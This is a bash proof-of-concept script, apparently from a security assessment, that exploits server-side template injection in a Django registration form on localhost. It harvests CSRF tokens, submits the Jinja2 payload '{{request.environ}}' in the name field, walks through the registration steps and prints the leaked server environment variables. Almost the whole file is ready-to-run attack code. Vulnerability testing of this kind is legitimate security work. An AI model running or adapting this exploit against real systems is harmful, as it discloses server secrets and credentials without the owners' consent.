#!/bin/bash
# Server-Side Template Injection (SSTI) POC
# This demonstrates that the registration name field is vulnerable to SSTI
# The {{request.environ}} Jinja2 template expression is evaluated server-side

echo "[*] SSTI Vulnerability POC - Environment Variable Disclosure"
echo "[*] Target: http://localhost/accounts/register/step1/"
echo ""

# Step 1: Navigate to step1 and get CSRF token
echo "[+] Step 1: Getting CSRF token from step1"
RESPONSE=$(curl -s http://localhost/accounts/register/step1/ -c /tmp/poc_cookies.txt -b /tmp/poc_cookies.txt)
CSRF=$(echo "$RESPONSE" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')
echo "    CSRF Token: ${CSRF:0:20}..."

# Step 2: Submit SSTI payload in name field
echo "[+] Step 2: Submitting SSTI payload in name field"
PAYLOAD='test_{{request.environ}}_test'
echo "    Payload: $PAYLOAD"

curl -s -X POST http://localhost/accounts/register/step1/ \
  -b /tmp/poc_cookies.txt \
  -c /tmp/poc_cookies.txt \
  -d "csrfmiddlewaretoken=$CSRF&name=$PAYLOAD&password=password1234" > /dev/null

# Step 3: Navigate to step2 and submit email
echo "[+] Step 3: Completing step 2 with valid email"
RESPONSE=$(curl -s http://localhost/accounts/register/step2/ -b /tmp/poc_cookies.txt)
CSRF=$(echo "$RESPONSE" | grep -oP 'csrfmiddlewaretoken.*?value="\K[^"]+')

curl -s -X POST http://localhost/accounts/register/step2/ \
  -b /tmp/poc_cookies.txt \
  -c /tmp/poc_cookies.txt \
  -d "csrfmiddlewaretoken=$CSRF&email=test@example.com" > /dev/null

# Step 4: Retrieve step3 and extract the SSTI result
echo "[+] Step 4: Retrieving step3 to extract evaluated SSTI"
RESPONSE=$(curl -s http://localhost/accounts/register/step3/ -b /tmp/poc_cookies.txt)

# Extract the environment data that was evaluated
ENVIRON=$(echo "$RESPONSE" | grep -oP 'alert\("Hello test_\K[^_]+' 2>/dev/null)

if [ -z "$ENVIRON" ]; then
    echo "[-] SSTI not detected or payload not reflected"
    exit 1
fi

echo ""
echo "[+] SUCCESS: SSTI Detected! Environment variables exposed:"
echo ""
echo "$ENVIRON" | sed 's/&#x27;/"/g' | sed 's/&lt;/</g' | sed 's/&gt;/>/g' | python3 -m json.tool 2>/dev/null | head -30

echo ""
echo "[+] SSTI Information Disclosure Confirmed"
echo "    - Django settings module accessible"
echo "    - Environment variables accessible" 
echo "    - WSGI request object accessible"
echo "    - Potential for credential/key disclosure"

# Cleanup
rm -f /tmp/poc_cookies.txt
